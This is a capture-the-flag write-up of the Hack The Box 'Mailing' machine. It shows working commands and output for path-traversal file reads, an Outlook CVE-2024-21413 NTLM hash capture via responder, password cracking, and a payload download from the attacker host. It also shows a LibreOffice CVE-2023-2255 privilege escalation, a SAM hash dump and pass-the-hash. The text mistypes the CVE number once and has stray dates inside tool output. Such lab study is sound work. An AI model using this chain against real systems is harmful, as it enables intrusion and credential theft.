---
layout: post
title: "HTB: Mailing"
box: mailing
img: /img/mailing/mailing
author: Andrew Cherney
date: 2024-09-09
tags: htb easy-box windows webapp cve smtp lfi directory-traversal responder libreoffice season-5
icon: "assets/icons/mailing.png"
post_description: "A semi-standard windows experience of a box fit with outdated software and common Active Directory exploit vectors. To start the webapp is vulnerable to directory traversal and gives LFI on the windows system. The .ini file for the hMailServer service can be read to give an admin account login password. Through that mail service the user maya can be emailed to exploit an outlook CVE to capture an NTLM hash upon SMB resource access attempt. That hash when cracked gives a foothold to discover an outdated LibreOffice version and a suspicious directory. Another CVE can be leveraged to run commands as local admin and change maya's permissions to compromise the box."
---

# Summary

{{ page.post_description }}

# Enumeration

```bash
nmap -sC -sV 10.129.154.7

Starting Nmap 7.92 ( https://nmap.org ) at 2024-05-05 23:33 CDT
Nmap scan report for 10.129.154.7
Host is up (0.064s latency).
Not shown: 990 filtered tcp ports (no-response)
PORT    STATE SERVICE       VERSION
25/tcp  open  smtp          hMailServer smtpd
| smtp-commands: mailing.htb, SIZE 20480000, AUTH LOGIN PLAIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
80/tcp  open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Did not follow redirect to http://mailing.htb
110/tcp open  pop3          hMailServer pop3d
|_pop3-capabilities: UIDL USER TOP
135/tcp open  msrpc         Microsoft Windows RPC
139/tcp open  netbios-ssn   Microsoft Windows netbios-ssn
143/tcp open  imap          hMailServer imapd
|_imap-capabilities: OK QUOTA CHILDREN ACL completed CAPABILITY RIGHTS=texkA0001 SORT IDLE NAMESPACE IMAP4rev1 IMAP4
445/tcp open  microsoft-ds?
465/tcp open  ssl/smtp      hMailServer smtpd
| ssl-cert: Subject: commonName=mailing.htb/organizationName=Mailing Ltd/stateOrProvinceName=EU\Spain/countryName=EU
| Not valid before: 2024-02-27T18:24:10
|_Not valid after:  2029-10-06T18:24:10
|_ssl-date: TLS randomness does not represent time2024-09-09
| smtp-commands: mailing.htb, SIZE 20480000, AUTH LOGIN PLAIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
587/tcp open  smtp          hMailServer smtpd
|_ssl-date: TLS randomness does not represent time2024-09-09
| ssl-cert: Subject: commonName=mailing.htb/organizationName=Mailing Ltd/stateOrProvinceName=EU\Spain/countryName=EU
| Not valid before: 2024-02-27T18:24:10
|_Not valid after:  2029-10-06T18:24:10
| smtp-commands: mailing.htb, SIZE 20480000, STARTTLS, AUTH LOGIN PLAIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
993/tcp open  ssl/imap      hMailServer imapd
|_ssl-date: TLS randomness does not represent time2024-09-09
| ssl-cert: Subject: commonName=mailing.htb/organizationName=Mailing Ltd/stateOrProvinceName=EU\Spain/countryName=EU
| Not valid before: 2024-02-27T18:24:10
|_Not valid after:  2029-10-06T18:24:10
|_imap-capabilities: OK QUOTA CHILDREN ACL completed CAPABILITY RIGHTS=texkA0001 SORT IDLE NAMESPACE IMAP4rev1 IMAP4
Service Info: Host: mailing.htb; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 2s
| smb2-time: 
|   date: 2024-05-06T04:33:382024-09-09
|_  start_date: N/A2024-09-09
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
```

## Port 80

![hMailServer front page w/ download]({{ page.img }}_front_page.png)

Here we have a webpage for setting up an email client hMailClient, with a download button. I threw out a directory and subdomain fuzz and found nothing interesting besides download.php, the endpoint used by the download button.

The pdf that button download contains generic instructions for setting up an email client to connect to mailing.htb as an IMAP4 account. Credentials of user@mailing.htb:password exist within the document, and maya is a potential user given her name appears within the pdf. Visiting *download.php* without any parameters gives an error that asks for a file. 

![download php port 80]({{ page.img }}_download_php_test.png)

# User as maya

## LFI

When downloading the pdf the download button sends a GET request to the download.php file with a parameter *file* that defined the pdf within the url. To test if I can abuse this I will try to download *index.php* by visiting `http://mailing.htb/download.php?file=../index.php`

![index.php download]({{ page.img }}_index_php_download.png)

In theory here I have LFI within the entire filesystem. We know from the box details and the nmap scan this is a windows box. The equivalent file of **/etc/hosts** for windows that I check is *Windows/System32/drivers/etc/hosts*, it serves the same purpose as */etc/hosts*. `http://mailing.htb/download.php?file=../../../../../Windows/System32/drivers/etc/hosts` ends up downloading me the hosts file. Nothing useful in there but I can now look to configuration files for services. 

We know here that hMailServer is the mail service being used, and luckily for us there is ample documentation on their site about files and the directory structure. At [hmailserver.com/](https://www.hmailserver.com/) you can head to documentation, then select any version. Under the 
[Ini-file settings](https://www.hmailserver.com/documentation/latest/?page=reference_inifilesettings) section exists the mention of a file **hMailServer.ini** which contains the database password, and administrator password encoded in MD5. Next within the *Other* category of the documentation page there is a [hMailServer folder structure](https://www.hmailserver.com/documentation/latest/?page=folderstructure) page. Under that page we find that **/Bin** is the place the ini file is likely to be, but worst case scenario we can try to fuzz for the directory now that we know the file we are looking for. 

Finally heading to the [Installation tutorial](https://www.hmailserver.com/documentation/latest/?page=howto_install) under Quick-Start guide will tell us the default place for hMailServer to be placed is **C:\\Program Files\\hMailServer**, and putting this all together I head to `http://mailing.htb/download.php?file=../../../../../Program+Files/hMailServer/Bin/hMailServer.ini` and try to download the config file for hMailServer.

But that wasn't the end of the story here, because that does not work. There are two possible **Program Files** that can be in windows, the normally named one, and the 32 bit (x86) version. So the final endpoint is `http://mailing.htb/download.php?file=../../../../../Program+Files+(x86)/hMailServer/Bin/hMailServer.ini`. The contents of that file are as follows:

```ini
[Directories]
ProgramFolder=C:\Program Files (x86)\hMailServer
DatabaseFolder=C:\Program Files (x86)\hMailServer\Database
DataFolder=C:\Program Files (x86)\hMailServer\Data
LogFolder=C:\Program Files (x86)\hMailServer\Logs
TempFolder=C:\Program Files (x86)\hMailServer\Temp
EventFolder=C:\Program Files (x86)\hMailServer\Events
[GUILanguages]
ValidLanguages=english,swedish
[Security]
AdministratorPassword=841bb5acfa6779ae432fd7a4e6600ba7
[Database]
Type=MSSQLCE
Username=
Password=0a9f8ad8bf896b501dde74f08efd7e4c
PasswordEncryption=1
Port=0
Server=
Database=hMailServer
Internal=1
```

If you toss that into crackstation it yields the password: **homenetworkingadministrator**. Given this is the admin password for the mail service we now need to login to that service as the administrator and enumerate further from there.

## administrator@mailing.htb

To login as the administrator account on the mail server we can use Thunderbird which comes baseline on Parrot, and many other linux distros. 

![thunderbird admin login]({{ page.img }}_email_login_admin.png)

![successful login admin]({{ page.img }}_admin_account_login.png)

The admin mail account has one contact of maya@mailing.htb, and from here it is certain that mailing that account something is the next step, but finding what is the challenge.

## CVE-2024-21413

First avenue I thought of was some XSS that we could abuse. I am unsure of what functionality I would have afforded to me but I can still check if maya visiting an email with XSS inside of it can ping back to a server I host. I try a couple payloads and get no responses back. Doing this on Thunderbird requires inserting HTML. 


![email insert html]({{ page.img }}_thunderbird_inserted_html.png)

```
<a href='file:///\\\\10.10.11.14\\1'>1</a>
<a href='file://10.10.11.14/3'>3</a>
```

Admittedly in retrospect knowing what I do now about XSS there are a lot more tests I could have done to call back or evade some filter or AV or firewall. Glad I didn't in the case but in the future it would warrant a closer inspection. For this specific case there is a CVE that was semi-recent when the box was released of [CVE-2023-21413](https://github.com/xaitax/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability), an outlook vulnerability that can lead to RCE. The TLDR is appending a file location such as above with **!something** till turn it into a moniker and when handling that it will remove the *file://* and access whatever resource is left over. We can use this to request access to a file on an SMB share that doesn't exist at my IP and when the NTLM hash is broadcast to request access to the resource I might be able to grab and crack that hash. 

I found a poc written in python to send the email with the payload, and I am partial to commandline tools. Spin up responder then run the tool.

```bash
sudo responder -I tun0
```

```bash
python3 CVE-2024-21413.py --server mailing.htb --port 587 --username administrator@mailing.htb --password homenetworkingadministrator --sender administrator@mailing.htb --recipient maya@mailing.htb --url "\\10.10.11.14\test\meeting" --subject "CVE" 
CVE-2024-21413 | Microsoft Outlook Remote Code Execution Vulnerability PoC.
Alexander Hagenah / @xaitax / ah@primepage.de

✅ Email sent successfully.

```

Now I must admit it took some tries to get this working. responder is notorious for being a little awkward to use properly and even within video guides I have followed with supplied materials the tools might not even work in isolated and curated environments. Keep at it, try another version if the one you use doesn't work. Or best of all have a baseline kali box for AD and windows environments since out of the box kali is far better for windows. 

```
maya::MAILING:dac4fe0aec512cc8:0ABF7016C9D7428230E543395441DBCD:010100000000000000EF6F99469EDA01293B5F358D9EF4DE0000000002000800540058005800340001001E00570049004E002D00380038003200520041004E005000380044004500500004003400570049004E002D00380038003200520041004E00500038004400450050002E0054005800580034002E004C004F00430041004C000300140054005800580034002E004C004F00430041004C000500140054005800580034002E004C004F00430041004C000700080000EF6F99469EDA01060004000200000008003000300000000000000000000000002000009BE5ABAC0CB766267616E7031B83C21B57E7A52A6903503167DE1974F23E1F3B0A0010000000000000000000000000000000000009001E0063006900660073002F00310030002E00310030002E00310034002E0035000000000000000000
```

```bash
john hash --wordlist=/opt/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
m4y4ngs4ri       (maya)
1g 0:00:00:02 DONE (2024-05-10 20:06) 0.4291g/s 2546Kp/s 2546Kc/s 2546KC/s m61405..m4895621
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed
```

The tool of choice to connect to windows machines is evil-winrm, you can use passwords, certs, and hashes, it is versatile and should be explored if you intend to spend any time within windows environments. 

```bash
evil-winrm -i mailing.htb -u maya -p m4y4ngs4ri

Evil-WinRM shell v3.4

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\maya\Documents> ls


    Directory: C:\Users\maya\Documents


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----         3/13/2024   4:49 PM                WindowsPowerShell
-a----         5/11/2024   2:01 AM            592 helper.py
-a----         4/11/2024   1:24 AM            807 mail.py
-a----         3/14/2024   4:30 PM            557 mail.vbs

*Evil-WinRM* PS C:\Users\maya> cd Desktop
*Evil-WinRM* PS C:\Users\maya\Desktop> ls


    Directory: C:\Users\maya\Desktop


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         2/28/2024   7:34 PM           2350 Microsoft Edge.lnk
-ar---          5/9/2024   6:07 PM             34 user.txt


*Evil-WinRM* PS C:\Users\maya\Desktop> type user.txt
4db9535bdcfdd-------------------
```

# Root

## Inherited Permissions

While looking around for anything out of place I cam across an odd-named folder within *C:* called **Important Documents**. This was deliberately placed here so I checked its access control lists and found something odd.

```bash
*Evil-WinRM* PS C:\> ls


    Directory: C:\


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----         5/11/2024   2:03 AM                Important Documents
d-----         2/28/2024   8:49 PM                inetpub
d-----         12/7/2019  10:14 AM                PerfLogs
d-----          3/9/2024   1:47 PM                PHP
d-r---         3/13/2024   4:49 PM                Program Files
d-r---         3/14/2024   3:24 PM                Program Files (x86)
d-r---          3/3/2024   4:19 PM                Users
d-----         5/11/2024   2:07 AM                Windows
d-----         4/12/2024   5:54 AM                wwwroot

*Evil-WinRM* PS C:\> icacls 'important documents'
important documents MAILING\maya:(OI)(CI)(M)
                    BUILTIN\Administradores:(I)(OI)(CI)(F)
                    NT AUTHORITY\SYSTEM:(I)(OI)(CI)(F)
                    BUILTIN\Usuarios:(I)(OI)(CI)(RX)
                    NT AUTHORITY\Usuarios autentificados:(I)(M)
                    NT AUTHORITY\Usuarios autentificados:(I)(OI)(CI)(IO)(M)
```

Every file within this directory will have local admin inherited permissions. Additionally from *Program Files* we see LibreOffice is installed and when checking the readme we find a peculiar version number.

```bash
*Evil-WinRM* PS C:\Program Files\LibreOffice\readmes> type readme_en-US.txt


======================================================================

LibreOffice 7.4 ReadMe

======================================================================

...
```

I need to check if the **Important Documents** folder handles the files in any way automatically before crafting my payload. I make a test file then place it inside.

```
*Evil-WinRM* PS C:\important documents> wget http://10.10.14.4:8081/test.odt -o test.odt
*Evil-WinRM* PS C:\important documents> ls


    Directory: C:\important documents


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         5/11/2024   4:06 AM              0 test.odt


*Evil-WinRM* PS C:\important documents> ls

```

After some arbitrary amount of time passes it does remove the file. Onto searching for ways to exploit this functionality.


## CVE-2023-2255

[CVE-2023-2255](https://www.cvedetails.com/cve/CVE-2023-2255/ "CVE-2023-2255 security vulnerability details") is a LibreOffice vulnerability affecting versions 7.4.7 and prior. It causes external links to be loaded without prompt. There is a poc I found on github to create a malicious *.odt* file that will run a supplied command. I'll check what LocalGroups exist to find out which I should make maya a part of with this exploit, then I will run the script at [https://github.com/elweth-sec/CVE-2023-2255](https://github.com/elweth-sec/CVE-2023-2255). 

```
*Evil-WinRM* PS C:\important documents> Get-LocalGroup

Name                                          Description
----                                          -----------
Administradores                               Los administradores tienen acceso completo y sin restricciones al equipo o dominio
Administradores de Hyper-V                    Los miembros de este grupo tienen acceso completo y sin restricciones a todas las características de Hyper-V.
Duplicadores                                  Pueden replicar archivos en un dominio
IIS_IUSRS                                     Grupo integrado usado por Internet Information Services.
...
```

Good thing I looked I would not have guessed to have added maya to Administradoes. 

```bash
python3 CVE-2023-2255.py --cmd 'net localgroup "Administradores" "maya" /add' --output 'exploit.odt'
```

```bash
*Evil-WinRM* PS C:\important documents> curl http://10.10.14.4:8081/exploit.odt -o exploit.odt
*Evil-WinRM* PS C:\important documents> ls


    Directory: C:\important documents


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         5/11/2024   3:45 AM          30530 exploit.odt


*Evil-WinRM* PS C:\important documents> whoami /groups

GROUP INFORMATION
-----------------

Group Name                                   Type             SID          Attributes
============================================ ================ ============ ==================================================
Todos                                        Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users              Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
BUILTIN\Usuarios                             Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
BUILTIN\Usuarios de escritorio remoto        Alias            S-1-5-32-555 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                         Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Usuarios autentificados         Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Esta compañía                   Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Cuenta local                    Well-known group S-1-5-113    Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Autenticación NTLM              Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Etiqueta obligatoria\Nivel obligatorio medio Label            S-1-16-8192
```

Wait some time and the file disappears and we are now **Administradores**

```bash
*Evil-WinRM* PS C:\important documents> net user maya
User name                    maya
Full Name
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            2024-04-12 4:16:20 AM
Password expires             Never
Password changeable          2024-04-12 4:16:20 AM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   2024-05-11 3:50:11 AM

Logon hours allowed          All

Local Group Memberships      *Administradores      *Remote Management Use
                             *Usuarios             *Usuarios de escritori
Global Group memberships     *Ninguno
The command completed successfully.
```

From here I have effectively pwned the box, but I need to dump the SAM hashes and pass the hash with impacket to login at localadmin.

```bash
crackmapexec smb mailing.htb -u maya -p m4y4ngs4ri --sam

SMB         10.10.11.14     445    MAILING          [*] Windows 10.0 Build 19041 x64 (name:MAILING) (domain:MAILING) (signing:False) (SMBv1:False)
SMB         10.10.11.14     445    MAILING          [+] MAILING\maya:m4y4ngs4ri (Pwn3d!)
SMB         10.10.11.14     445    MAILING          [*] Dumping SAM hashes
SMB         10.10.11.14     445    MAILING          Administrador:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         10.10.11.14     445    MAILING          Invitado:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         10.10.11.14     445    MAILING          DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         10.10.11.14     445    MAILING          WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:e349e2966c623fcb0a254e866a9a7e4c:::
SMB         10.10.11.14     445    MAILING          localadmin:1001:aad3b435b51404eeaad3b435b51404ee:9aa582783780d1546d62f2d102daefae:::
SMB         10.10.11.14     445    MAILING          maya:1002:aad3b435b51404eeaad3b435b51404ee:af760798079bf7a3d80253126d3d28af:::
SMB         10.10.11.14     445    MAILING          [+] Added 6 SAM hashes to the database
```

```bash
impacket.wmiexec localadmin@mailing.htb -hashes aad3b435b51404eeaad3b435b51404ee:9aa582783780d1546d62f2d102daefae
Impacket v0.12.0.dev1+20240116.639.82267d84 - Copyright 2023 Fortra

[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>whoami
mailing\localadmin

C:\>cd Users
C:\Users>ls
'ls' is not recognized as an internal or external command,
operable program or batch file.

C:\Users>dir
 Volume in drive C has no label.
 Volume Serial Number is 9502-BA18

 Directory of C:\Users

2024-03-03  05:19 PM    <DIR>          .
2024-03-03  05:19 PM    <DIR>          ..
2024-02-28  09:50 PM    <DIR>          .NET v2.0
2024-02-28  09:50 PM    <DIR>          .NET v2.0 Classic
2024-02-28  09:50 PM    <DIR>          .NET v4.5
2024-02-28  09:50 PM    <DIR>          .NET v4.5 Classic
2024-02-28  09:50 PM    <DIR>          Classic .NET AppPool
2024-03-09  02:52 PM    <DIR>          DefaultAppPool
2024-03-04  09:32 PM    <DIR>          localadmin
2024-02-28  08:34 PM    <DIR>          maya
2024-03-10  05:56 PM    <DIR>          Public
               0 File(s)              0 bytes
              11 Dir(s)   3,886,714,880 bytes free

C:\Users>cd localadmin/Desktop
C:\Users\localadmin\Desktop>dir
 Volume in drive C has no label.
 Volume Serial Number is 9502-BA18

 Directory of C:\Users\localadmin\Desktop

2024-04-12  06:10 AM    <DIR>          .
2024-04-12  06:10 AM    <DIR>          ..
2024-02-27  05:30 PM             2,350 Microsoft Edge.lnk
2024-05-09  06:07 PM                34 root.txt
               2 File(s)          2,384 bytes
               2 Dir(s)   3,886,706,688 bytes free

C:\Users\localadmin\Desktop>type root.txt
6d3d479bac473-------------------
```

